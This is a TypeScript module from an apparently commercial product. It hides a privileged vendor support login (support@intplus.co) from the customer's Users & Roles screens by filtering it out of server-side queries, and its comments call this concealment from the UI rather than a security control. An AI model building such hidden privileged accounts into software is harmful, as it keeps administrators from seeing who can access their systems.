/**
 * Accounts the product operates with but never shows in the admin UI.
 *
 * The support account is a real, privileged login used to administer a customer's
 * instance. It is not part of their staff directory, so listing it in Users &
 * Roles invites an administrator to edit, suspend or delete the account their
 * own vendor supports them through — and it pads every user count and search
 * result with a row that means nothing to them.
 *
 * Hiding is applied server-side, in the queries that back the tables, rather
 * than in the components: a client-side filter would still ship the account in
 * the response, and each new screen would have to remember to re-apply it.
 *
 * This is concealment from the UI, not a privilege boundary. Anyone who can call
 * the API can still act on the account by id.
 */

/** Support logins, lower-cased — `User.email` is stored lower-cased. */
export const HIDDEN_SYSTEM_ACCOUNT_EMAILS: string[] = ["support@intplus.co"];

/** Mongo fragment excluding the hidden accounts from a `User` query. */
export const HIDDEN_ACCOUNT_QUERY = {
  email: { $nin: HIDDEN_SYSTEM_ACCOUNT_EMAILS },
} as const;

/** True when this address belongs to a concealed support account. */
export function isHiddenSystemAccount(email?: string | null): boolean {
  return !!email && HIDDEN_SYSTEM_ACCOUNT_EMAILS.includes(email.trim().toLowerCase());
}
